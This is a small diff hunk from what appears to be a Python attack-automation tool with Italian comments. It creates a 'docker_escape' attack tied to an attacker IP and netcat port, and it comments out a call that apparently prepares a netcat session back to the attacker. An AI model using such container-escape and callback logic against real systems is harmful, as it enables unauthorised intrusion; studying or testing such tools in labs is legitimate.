@@ -141,7 +141,7 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                         #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
                         
                         docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
-                        mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
+                        #mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
 
                         sess={}
                         for i in range (0,5):
